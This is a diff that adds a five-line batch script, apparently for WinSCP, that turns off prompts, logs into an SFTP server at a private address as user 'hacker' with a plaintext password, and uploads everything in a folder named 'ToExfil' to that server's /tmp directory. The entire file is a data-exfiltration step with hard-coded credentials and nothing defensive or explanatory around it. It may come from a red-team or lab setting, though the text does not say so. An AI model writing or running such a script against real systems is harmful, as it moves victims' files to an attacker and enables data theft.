@@ -1,0 +1,5 @@
+option batch abort
+option confirm off
+open sftp://hacker:Hack@123@10.1.1.59/
+put C:\Users\Public\ToExfil\* /tmp/
+exit
